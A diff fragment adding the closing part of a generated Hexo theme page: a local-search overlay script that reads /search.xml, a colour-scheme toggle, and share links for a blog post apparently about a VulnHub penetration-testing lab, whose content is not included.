+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0 + '&url=' + http%3A%2F%2Fsovohelp.fit%2F2023%2F01%2F05%2FVulnHub-Lin-Security1%25E9%259D%25B6%25E6%259C%25BA%25E6%25B8%2597%25E9%2580%258F%25E5%25AD%25A6%25E4%25B9%25A0%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://sovohelp.fit/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
